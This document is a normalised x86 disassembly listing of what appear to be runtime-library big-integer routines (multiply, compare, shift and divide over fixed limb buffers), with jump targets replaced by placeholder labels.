mov ecx [ ebp - 0x750 ]
or eax edx
mov [ ebp + edi * 4 - 0x1d0 ] eax
sub ecx 0x4
mov eax [ ebp - 0x74c ]
dec edi
mov [ ebp - 0x750 ] ecx
cmp edi 0xffffffff
je r-xdata
cmp [ ebp - 0x745 ] 0x0
je r-xdata
mov ecx eax
lea edi [ ebp - 0x1d0 ]
xor eax eax
[ edi ]
mov edx [ ebp - 0x760 ]
cmp esi ebx
jae r-xdata
mov eax [ ebp + 0x1c ]
dec eax
cmp eax ecx
jb r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov ecx [ ebp - 0x770 ]
mov [ ecx ] eax
mov ecx [ ebp + 0x10 ]
test eax eax
js r-xdata
mov eax [ ebp + ecx * 4 - 0x570 ]
mul edi
add eax esi
mov [ ebp + ecx * 4 - 0x570 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx ebx
jne r-xdata
push 0x0
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] 0x0
push eax
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
mov [ ebp + eax * 4 - 0x1d0 ] esi
inc [ ebp - 0x1d4 ]
jmp r-xdata
mov eax edi
mul [ ebp + ecx * 4 - 0x1d0 ]
add eax esi
mov [ ebp + ecx * 4 - 0x1d0 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx ebx
jne r-xdata
test esi esi
je r-xdata
cmp edx 0x1cc
ja r-xdata
lea eax [ esi + ebx * 4 ]
mov eax [ ebp + eax - 0x740 ]
mov [ ebp - 0x774 ] eax
test eax eax
jne r-xdata
mov ebx [ ebp - 0x1d4 ]
xor esi esi
xor ecx ecx
jmp r-xdata
cmp eax 0x26
mov ebx eax
cmova ebx ecx
mov [ ebp - 0x764 ] ebx
movzx ecx [ ebx * 4 + r--data ]
movzx esi [ ebx * 4 + r--data ]
lea edi [ ecx * 4 ]
lea eax [ ecx + esi ]
push edi
mov [ ebp - 0x3a4 ] eax
lea eax [ ebp - 0x3a0 ]
push 0x0
push eax
call sub_40de60
lea eax [ esi * 4 ]
push eax
movzx eax [ ebx * 4 + r--data ]
lea eax [ eax * 4 + r--data ]
push eax
lea eax [ ebp - 0x3a0 ]
add eax edi
push eax
call sub_40d8e0
mov ecx [ ebp - 0x3a4 ]
add esp 0x18
cmp ecx 0x1
ja r-xdata
mov ecx [ ebp - 0x768 ]
mov edx [ ebp - 0x778 ]
mov eax edi
mul [ ebp + ecx * 4 - 0x1d0 ]
add eax esi
mov [ ebp + ecx * 4 - 0x1d0 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx ebx
jne r-xdata
test esi esi
je r-xdata
mov eax edi
mul [ ebp + ecx * 4 - 0x570 ]
add eax esi
mov [ ebp + ecx * 4 - 0x570 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx ebx
jne r-xdata
cmp edx 0x1cc
ja r-xdata
lea eax [ esi + ebx * 4 ]
mov eax [ ebp + eax - 0x740 ]
mov [ ebp - 0x760 ] eax
test eax eax
jne r-xdata
mov ebx [ ebp - 0x574 ]
xor esi esi
xor ecx ecx
lea ebx [ ebx ]
cmp eax 0x26
mov ebx eax
cmova ebx ecx
mov [ ebp - 0x768 ] ebx
movzx ecx [ ebx * 4 + r--data ]
movzx esi [ ebx * 4 + r--data ]
lea edi [ ecx * 4 ]
lea eax [ ecx + esi ]
push edi
mov [ ebp - 0x3a4 ] eax
lea eax [ ebp - 0x3a0 ]
push 0x0
push eax
call sub_40de60
lea eax [ esi * 4 ]
push eax
movzx eax [ ebx * 4 + r--data ]
lea eax [ eax * 4 + r--data ]
push eax
lea eax [ ebp - 0x3a0 ]
add eax edi
push eax
call sub_40d8e0
mov ecx [ ebp - 0x3a4 ]
add esp 0x18
cmp ecx 0x1
ja r-xdata
mov ecx [ ebp - 0x774 ]
mov eax edi
mul [ ebp + ecx * 4 - 0x570 ]
add eax esi
mov [ ebp + ecx * 4 - 0x570 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx ebx
jne r-xdata
cmp edi eax
jb r-xdata
mov [ ebp - 0x1d4 ] edx
jmp r-xdata
lea eax [ edx + 0x1 ]
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
xor edx edx
mov edx [ ecx ]
jmp r-xdata
mov ecx [ ebp - 0x76c ]
add eax ecx
mov [ ebp - 0x750 ] eax
cmp edi eax
je r-xdata
mov eax ecx
add ecx eax
mov edi [ ebp - 0x74c ]
test esi esi
je r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
push 0x1cc
lea eax [ ebp - 0x1d0 ]
push 0x0
push eax
call sub_40de60
add esp 0xc
call sub_42fef5
mov [ eax ] 0x22
call sub_42fdcf
push edx
lea eax [ ebp - 0x740 ]
push eax
lea eax [ ebp - 0x1d0 ]
push eax
call sub_40d8e0
add esp 0xc
jmp r-xdata
xor esi esi
xor edi edi
mov ecx ebx
cmp [ ebp - 0x74c ] esi
je r-xdata
cmp ebx edx
jne r-xdata
mov eax edi
mul [ ebp + ecx * 4 - 0x1d0 ]
add eax esi
mov [ ebp + ecx * 4 - 0x1d0 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx ebx
jne r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
test esi esi
je r-xdata
push 0x1cc
lea eax [ ebp - 0x570 ]
push 0x0
push eax
call sub_40de60
add esp 0xc
call sub_42fef5
mov [ eax ] 0x22
call sub_42fdcf
push edx
lea eax [ ebp - 0x740 ]
push eax
lea eax [ ebp - 0x570 ]
push eax
call sub_40d8e0
add esp 0xc
jmp r-xdata
xor esi esi
xor edi edi
mov ecx ebx
cmp [ ebp - 0x74c ] esi
je r-xdata
cmp ebx edx
jne r-xdata
mov eax edi
mul [ ebp + ecx * 4 - 0x570 ]
add eax esi
mov [ ebp + ecx * 4 - 0x570 ] eax
adc edx 0x0
inc ecx
mov esi edx
cmp ecx ebx
jne r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebp - 0x3a0 ] 0x4
xor eax eax
mov eax [ ecx - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
mov [ edi ] 0x0
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebp - 0x574 ]
cmp eax 0x73
jae r-xdata
mov [ ebp + eax * 4 - 0x1d0 ] esi
inc [ ebp - 0x1d4 ]
jmp r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
inc ebx
cmp ebx [ ebp - 0x758 ]
jne r-xdata
lea edx [ ebx + 0x1 ]
mov [ ebp + ebx * 4 - 0x740 ] eax
mov [ ebp - 0x744 ] edx
jmp r-xdata
test esi esi
je r-xdata
push 0x0
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] 0x0
push eax
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
xor al al
jmp r-xdata
mov [ ebp + eax * 4 - 0x1d0 ] esi
inc [ ebp - 0x1d4 ]
jmp r-xdata
mov eax [ ebp - 0x574 ]
cmp eax 0x73
jae r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
inc ebx
cmp ebx [ ebp - 0x758 ]
jne r-xdata
lea edx [ ebx + 0x1 ]
mov [ ebp + ebx * 4 - 0x740 ] eax
mov [ ebp - 0x744 ] edx
jmp r-xdata
mov eax [ ebp - 0x574 ]
cmp eax 0x73
jae r-xdata
mov eax [ ebp - 0x574 ]
cmp eax 0x73
jae r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
and eax [ ebp - 0x768 ]
dec esi
mov ecx [ ebp - 0x75c ]
and edx [ ebp - 0x764 ]
shr eax cl
mov ecx [ ebp - 0x758 ]
shl edx cl
mov ecx [ ebp - 0x750 ]
or eax edx
mov [ ebp + edi * 4 - 0x1d0 ] eax
sub ecx 0x4
mov eax [ ebp - 0x74c ]
dec edi
mov [ ebp - 0x750 ] ecx
cmp edi 0xffffffff
je r-xdata
mov eax [ rw-data ]
test al 0x1
jne r-xdata
push 0x0
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] 0x0
push eax
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x574 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
jmp r-xdata
mov [ ebp + eax * 4 - 0x570 ] esi
inc [ ebp - 0x574 ]
jmp r-xdata
mov [ ebp - 0x1d4 ] 0x0
xor al al
jmp r-xdata
mov esi [ ebp - 0x760 ]
test esi esi
je r-xdata
cmp ecx edx
jne r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
test al al
je r-xdata
mov [ ebp + eax * 4 - 0x570 ] esi
inc [ ebp - 0x574 ]
jmp r-xdata
mov [ ebp - 0x574 ] 0x0
xor al al
jmp r-xdata
mov esi [ ebp - 0x764 ]
test esi esi
je r-xdata
cmp ecx edx
jne r-xdata
push 0x0
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] 0x0
push eax
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x574 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
xor al al
jmp r-xdata
mov [ ebp + eax * 4 - 0x570 ] esi
inc [ ebp - 0x574 ]
jmp r-xdata
mov [ ebp + eax * 4 - 0x570 ] esi
inc [ ebp - 0x574 ]
jmp r-xdata
cmp edi eax
jb r-xdata
mov eax [ rw-data ]
or eax 0x1
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
lea ecx [ ecx ]
mov eax [ ebp - 0x750 ]
mov eax [ eax + edi * 4 ]
mul [ ebp - 0x774 ]
add eax esi
adc edx 0x0
add eax [ ebp + ecx * 4 - 0x740 ]
mov [ ebp + ecx * 4 - 0x740 ] eax
adc edx 0x0
inc edi
inc ecx
mov esi edx
mov edx [ ebp - 0x744 ]
cmp edi [ ebp - 0x74c ]
jne r-xdata
lea eax [ ebx + 0x1 ]
mov [ ebp + ecx * 4 - 0x740 ] 0x0
add eax edi
mov [ ebp - 0x744 ] eax
mov [ ebp + eax * 4 - 0x1d0 ] esi
inc [ ebp - 0x1d4 ]
jmp r-xdata
test al al
je r-xdata
lea ecx [ ecx ]
mov eax [ ebp - 0x750 ]
mov eax [ eax + edi * 4 ]
mul [ ebp - 0x760 ]
add eax esi
adc edx 0x0
add eax [ ebp + ecx * 4 - 0x740 ]
mov [ ebp + ecx * 4 - 0x740 ] eax
adc edx 0x0
inc edi
inc ecx
mov esi edx
mov edx [ ebp - 0x744 ]
cmp edi [ ebp - 0x74c ]
jne r-xdata
lea eax [ ebx + 0x1 ]
mov [ ebp + ecx * 4 - 0x740 ] 0x0
add eax edi
mov [ ebp - 0x744 ] eax
test esi esi
je r-xdata
xor ecx ecx
test esi esi
je r-xdata
mov esi [ ebp - 0x1d4 ]
cmp esi eax
jne r-xdata
cmp ecx edx
jne r-xdata
cmp ecx edx
jne r-xdata
lea eax [ ebp - 0x574 ]
push eax
lea eax [ ebp - 0x1d4 ]
push eax
call sub_441440
mov ebx eax
add esp 0x8
mov eax [ ebp - 0x750 ]
mov esi 0x8
sub eax edi
mov [ ebp - 0x770 ] eax
lea esp [ esp ]
xor ebx ebx
mov edi 0x3b9aca00
xor ecx ecx
lea ebx [ ebx ]
mov [ edi ] cl
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax esi
xor esi esi
add eax [ ebp + ecx * 4 - 0x740 ]
mov [ ebp + ecx * 4 - 0x740 ] eax
mov edx [ ebp - 0x744 ]
adc esi esi
inc ecx
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
mov [ ebp + ecx * 4 - 0x740 ] 0x0
mov [ ebp - 0x744 ] eax
mov eax esi
xor esi esi
add eax [ ebp + ecx * 4 - 0x740 ]
mov [ ebp + ecx * 4 - 0x740 ] eax
mov edx [ ebp - 0x744 ]
adc esi esi
inc ecx
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
mov [ ebp + ecx * 4 - 0x740 ] 0x0
mov [ ebp - 0x744 ] eax
dec esi
cmp esi 0xffffffff
jne r-xdata
mov [ esi + edi ] cl
mov eax [ ebp + ecx * 4 - 0x1d0 ]
mul edi
add eax ebx
mov [ ebp + ecx * 4 - 0x1d0 ] eax
adc edx 0x0
inc ecx
mov ebx edx
cmp ecx esi
jne r-xdata
mov edi [ ebp - 0x74c ]
test ebx ebx
je r-xdata
mov eax [ ebp + ecx * 4 - 0x1d0 ]
cmp eax [ ecx * 4 + rw-data ]
jne r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
mov eax 0xcccccccd
mul ebx
shr edx 0x3
mov al dl
shl al 0x2
lea ecx [ eax + edx ]
mov eax [ ebp - 0x770 ]
add cl cl
sub bl cl
lea ecx [ ebx + 0x30 ]
mov ebx edx
cmp eax esi
jb r-xdata
cmp eax 0x9
jbe r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
inc ecx
cmp ecx esi
jne r-xdata
add edi eax
mov [ ebp - 0x74c ] edi
cmp edi [ ebp - 0x750 ]
jne r-xdata
mov eax 0x9
push 0x0
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] 0x0
push eax
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
mov [ ebp + eax * 4 - 0x1d0 ] ebx
inc [ ebp - 0x1d4 ]
jmp r-xdata
mov [ edi ] 0x0
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
sub_441260
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ edx ]
mov [ esi ] eax
mov eax [ edx ]
shl eax 0x2
push eax
lea eax [ edx + 0x4 ]
push eax
lea eax [ esi + 0x4 ]
push 0x1cc
push eax
call sub_443b14
add esp 0x10
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4412b0
mov edi edi
push esi
mov esi ecx
push esi
call sub_446d1d
mov eax [ esi ]
add esp 0x4
and eax 0x1f
cmp al 0x1f
jne r-xdata
push esi
call sub_446d83
add esp 0x4
mov [ esi + 0x8 ] 0x1
mov eax esi
pop esi
retn
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
retn
sub_4412f0
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ edx ]
mov [ esi ] eax
mov eax [ edx ]
shl eax 0x2
push eax
lea eax [ edx + 0x4 ]
push eax
lea eax [ esi + 0x4 ]
push 0x1cc
push eax
call sub_443b14
add esp 0x10
mov eax esi
pop esi
pop ebp
retn 0x4
sub_441330
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi ]
cmp esi [ ecx ]
je r-xdata
xor edx edx
test esi esi
je r-xdata
pop edi
xor al al
pop esi
pop ebp
retn
pop edi
mov al 0x1
pop esi
pop ebp
retn
lea eax [ ecx + 0x4 ]
sub edi ecx
inc edx
add eax 0x4
cmp edx esi
jne r-xdata
mov ecx [ edi + eax ]
cmp ecx [ eax ]
jne r-xdata
sub_441370
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ ecx ]
cmp esi [ edi ]
je r-xdata
xor edx edx
test esi esi
je r-xdata
xor cl cl
xor eax eax
test cl cl
pop edi
sete al
pop esi
pop ebp
retn
mov cl 0x1
xor eax eax
test cl cl
pop edi
sete al
pop esi
pop ebp
retn
lea eax [ ecx + 0x4 ]
sub edi ecx
jmp r-xdata
mov ecx [ eax ]
cmp ecx [ edi + eax ]
jne r-xdata
inc edx
add eax 0x4
cmp edx esi
jne r-xdata
sub_4413c0
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor eax eax
mov ecx [ edx ]
add ecx [ ebp + 0xc ]
adc eax eax
add ecx [ ebp + 0x10 ]
mov [ edx ] ecx
adc eax 0x0
pop ebp
retn
sub_4413e0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mul [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
adc edx 0x0
add eax [ ebp + 0x14 ]
mov [ ecx ] eax
adc edx 0x0
mov eax edx
pop ebp
retn
sub_441400
mov edi edi
push ebp
mov ebp esp
push ecx
bsr eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
inc eax
mov esp ebp
pop ebp
retn
sub_441440
mov edi edi
push ebp
mov ebp esp
sub esp 0x21c
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
test eax eax
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
mov ecx [ edi ]
test ecx ecx
jne r-xdata
xor edx edx
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea esi [ eax - 0x1 ]
lea eax [ ecx - 0x1 ]
mov [ ebp - 0xc ] esi
test eax eax
jne r-xdata
pop edi
xor eax eax
xor edx edx
pop ebx
mov esp ebp
pop ebp
retn
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x28 ] ecx
cmp ecx 0x1
jne r-xdata
pop esi
pop edi
xor eax eax
xor edx edx
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
lea ecx [ eax + 0x1 ]
sub edx eax
mov [ ebp - 0x38 ] ecx
mov ecx esi
cmp esi edx
jl r-xdata
test esi esi
jne r-xdata
mov esi [ ebx + 0x4 ]
lea ecx [ ebx + 0x4 ]
push eax
mov [ ebp - 0x21c ] eax
mov [ ebx ] eax
lea eax [ ebp - 0x218 ]
push eax
push 0x1cc
push ecx
call sub_443b14
add esp 0x10
mov eax esi
xor edx edx
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov eax ecx
inc esi
sub eax edx
lea esi [ ebx + esi * 4 ]
lea edi [ edi + eax * 4 ]
add edi 0x4
xor edi edi
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] edi
cmp esi 0xffffffff
je r-xdata
mov esi [ ebx + 0x4 ]
lea eax [ ebp - 0x218 ]
push 0x0
push eax
lea edi [ ebx + 0x4 ]
mov [ ebp - 0x21c ] 0x0
push 0x1cc
push edi
mov [ ebx ] 0x0
call sub_443b14
xor edx edx
mov eax esi
div [ ebp - 0x28 ]
add esp 0x10
xor ecx ecx
cmp ecx edx
mov [ edi ] edx
sbb ecx ecx
pop esi
neg ecx
xor edx edx
pop edi
mov [ ebx ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x38 ]
mov eax [ ebp + 0xc ]
mov esi [ eax + edi * 4 ]
mov eax [ eax + edi * 4 - 0x4 ]
mov [ ebp - 0x20 ] eax
bsr eax esi
mov [ ebp - 0x34 ] esi
je r-xdata
mov esi [ ebp + 0xc ]
mov eax ecx
sub eax edx
mov eax [ esi + eax * 4 + 0x4 ]
cmp eax [ ebx + ecx * 4 + 0x4 ]
jae r-xdata
dec ecx
sub edi 0x4
sub esi 0x4
cmp ecx edx
jge r-xdata
push 0x0
lea eax [ ebp - 0x218 ]
mov [ ebp - 0x21c ] 0x0
push eax
lea esi [ ebx + 0x4 ]
mov [ ebx ] 0x0
push 0x1cc
push esi
call sub_443b14
mov eax [ ebp - 0x10 ]
add esp 0x10
mov edx [ ebp - 0x4 ]
xor ecx ecx
cmp ecx eax
mov [ esi ] edi
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x8 ]
sbb ecx ecx
neg ecx
pop esi
inc ecx
pop edi
mov [ ebx ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
inc esi
inc eax
mov [ ebp - 0x1c ] eax
lea esi [ ebx + esi * 4 ]
lea esp [ esp ]
mov ecx 0x20
mov ecx 0x1f
sub ecx eax
jmp r-xdata
test edx edx
jne r-xdata
mov eax [ edi ]
cmp eax [ esi ]
jne r-xdata
jmp r-xdata
push 0x0
push ecx
xor eax eax
or eax [ esi ]
push edi
push eax
call sub_449720
mov [ ebp - 0x40 ] edx
lea esi [ esi - 0x4 ]
xor edx edx
mov [ ebp - 0x10 ] ebx
mov edi ecx
add edx eax
mov ecx [ ebp - 0x8 ]
adc ecx 0x0
mov [ ebp - 0x8 ] edx
sub [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x28 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x48 ] 0x0
add edx 0xffffffff
mov [ ebp - 0x1c ] edx
js r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x3c ]
shr eax cl
mov ecx [ ebp - 0x24 ]
shl [ ebp - 0x20 ] cl
shl esi cl
or esi eax
mov [ ebp - 0x34 ] esi
cmp edi 0x2
jbe r-xdata
mov eax 0x20
mov [ ebp - 0x24 ] ecx
sub eax ecx
mov [ ebp - 0x3c ] eax
test ecx ecx
je r-xdata
xor edi edi
lea ecx [ ebx + 0x4 ]
lea ecx [ ecx + edx * 4 ]
mov [ ebp - 0x10 ] ecx
lea eax [ edx + edi ]
lea ecx [ ebx - 0x4 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ecx + eax * 4 ]
mov [ ebp - 0x4c ] ecx
mov esi [ ebp + 0xc ]
mov ecx [ ebp - 0x3c ]
mov eax [ esi + edi * 4 - 0x8 ]
shr eax cl
or [ ebp - 0x20 ] eax
mov [ ebx ] edx
test edx edx
je r-xdata
lea ecx [ eax + 0x1 ]
lea ecx [ ebx + ecx * 4 ]
jmp r-xdata
xor eax eax
mov eax [ ecx + 0x8 ]
jmp r-xdata
mov edx esi
mov eax edi
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx ]
cmp [ ebx + ecx * 4 ] 0x0
jne r-xdata
mov [ ecx ] 0x0
lea ecx [ ecx + 0x4 ]
inc eax
cmp eax [ ebx ]
jb r-xdata
push 0x0
push [ ebp - 0x34 ]
push eax
push edx
call sub_449720
mov [ ebp - 0x28 ] ebx
xor esi esi
mov ebx eax
mov [ ebp - 0x28 ] esi
mov eax edx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x18 ] eax
mov edi ecx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x40 ] eax
test eax eax
jne r-xdata
mov edi ecx
mov eax edx
mov ecx [ ebp - 0x3c ]
xor esi esi
mov edx [ ebp - 0x4 ]
shr edi cl
mov ecx [ ebp - 0x24 ]
call sub_449990
mov ecx [ ebp - 0x24 ]
or esi edx
or edi eax
mov eax esi
mov esi [ ebp - 0x14 ]
mov edx edi
shl esi cl
cmp [ ebp - 0x8 ] 0x3
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] esi
jb r-xdata
cmp [ ebp - 0x24 ] 0x0
mov edx [ ecx + 0x4 ]
mov ecx [ ecx ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] ecx
jbe r-xdata
add ecx 0xffffffff
mov [ ebx ] ecx
jne r-xdata
push 0x0
push [ ebp - 0x34 ]
add ebx 0x1
adc eax 0xffffffff
push eax
push ebx
call sub_449900
add edi eax
adc esi edx
or ebx 0xffffffff
xor eax eax
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x40 ] eax
cmp ebx 0xffffffff
jbe r-xdata
mov eax [ ebp - 0x38 ]
add eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x3c ]
mov eax [ ebx + eax * 4 - 0x8 ]
shr eax cl
or esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] esi
test eax eax
jne r-xdata
jb r-xdata
test esi esi
ja r-xdata
mov ecx [ ebp - 0x38 ]
xor edi edi
xor esi esi
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
push eax
push ebx
xor ecx ecx
mov esi edi
or ecx [ ebp - 0x14 ]
push 0x0
push [ ebp - 0x20 ]
mov [ ebp - 0x4 ] ecx
call sub_449900
cmp edx esi
jb r-xdata
cmp edi 0xffffffff
ja r-xdata
xor eax eax
cmp eax esi
ja r-xdata
mov eax [ ebp + 0xc ]
mov ebx [ ebp - 0x10 ]
add eax 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] ecx
mov esi [ ebp - 0x48 ]
xor eax eax
mov edx [ ebp - 0x1c ]
add eax ebx
mov ecx [ ebp - 0x4c ]
mov edi eax
mov eax [ ebp - 0x8 ]
adc esi 0x0
sub [ ebp - 0x10 ] 0x4
dec edx
mov ebx [ ebp + 0x8 ]
sub ecx 0x4
dec eax
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x8 ] eax
test edx edx
jns r-xdata
mov eax [ ebp - 0x18 ]
ja r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0xc ] eax
jb r-xdata
sub eax ecx
mov [ ebx ] eax
add ebx 0x4
mov eax [ ebp - 0x14 ]
add eax 0x4
sub [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] eax
jne r-xdata
add edi 0x1
adc esi esi
cmp eax [ ebp - 0xc ]
ja r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
add ebx 0xffffffff
mov [ ebp - 0x44 ] ebx
adc eax 0xffffffff
add edi [ ebp - 0x34 ]
mov [ ebp - 0x18 ] eax
adc [ ebp - 0x28 ] 0x0
mov [ ebp - 0x40 ] eax
jne r-xdata
cmp eax [ ebp - 0x4 ]
jbe r-xdata
test ecx ecx
je r-xdata
cmp [ ebp - 0x30 ] edi
jae r-xdata
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x40 ]
mul [ ebp - 0x28 ]
mov ecx eax
mov eax [ ebp - 0x44 ]
mul [ ebp - 0x28 ]
add edx ecx
add edi eax
mov eax [ ebx ]
mov ecx edi
adc esi edx
mov edi esi
xor esi esi
cmp eax ecx
jae r-xdata
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0xc ]
inc edx
mov eax edx
cmp eax [ ebx ]
jae r-xdata
mov [ ebp - 0x4 ] ebx
cmp edi 0xffffffff
jbe r-xdata
add ebx 0xffffffff
adc [ ebp - 0x18 ] 0xffffffff
mov esi [ ebp + 0xc ]
mov edi ecx
mov edx [ ebp - 0x10 ]
add esi 0x4
mov ebx eax
lea esp [ esp ]
jmp r-xdata
mov ecx [ edx ]
lea esi [ esi + 0x4 ]
xor eax eax
lea edx [ edx + 0x4 ]
add ecx [ esi - 0x4 ]
adc eax eax
add ecx ebx
mov [ edx - 0x4 ] ecx
adc eax 0x0
mov ebx eax
sub edi 0x1
jne r-xdata
mov ebx [ ebp - 0x4 ]
sub_4418f0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x10 ]
test ecx ecx
mov [ eax + 0x8 ] ecx
setne dl
inc edx
mov [ eax ] edx
pop ebp
retn
sub_441910
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
shr eax 0x5
push esi
mov esi [ ebp + 0x8 ]
push edi
lea edi [ eax * 4 ]
mov [ ebp - 0x4 ] eax
push edi
lea eax [ esi + 0x4 ]
push 0x0
push eax
call sub_40de60
and ebx 0x1f
add esp 0xc
mov ecx ebx
mov edx 0x1
shl edx cl
mov eax esi
mov ecx [ ebp - 0x4 ]
mov [ edi + esi + 0x4 ] edx
inc ecx
pop edi
mov [ esi ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441960
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov edx [ ecx ]
mov [ ebp - 0x1e0 ] ebx
push edi
cmp edx 0x1
ja r-xdata
mov esi [ ebx ]
mov [ ebp - 0x1e4 ] esi
cmp esi 0x1
ja r-xdata
mov edi [ ecx + 0x4 ]
test edi edi
jne r-xdata
cmp edx esi
setb al
test al al
lea eax [ ebx + 0x4 ]
mov [ ebp - 0x1e8 ] eax
je r-xdata
mov edi [ ebx + 0x4 ]
lea esi [ ebx + 0x4 ]
mov [ ebx ] edx
mov eax [ ecx ]
shl eax 0x2
push eax
lea eax [ ecx + 0x4 ]
mov [ ebp - 0x1d8 ] edi
push eax
push 0x1cc
push esi
call sub_443b14
add esp 0x10
test edi edi
jne r-xdata
cmp edi 0x1
je r-xdata
push edi
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] edi
push eax
push 0x1cc
lea eax [ ebx + 0x4 ]
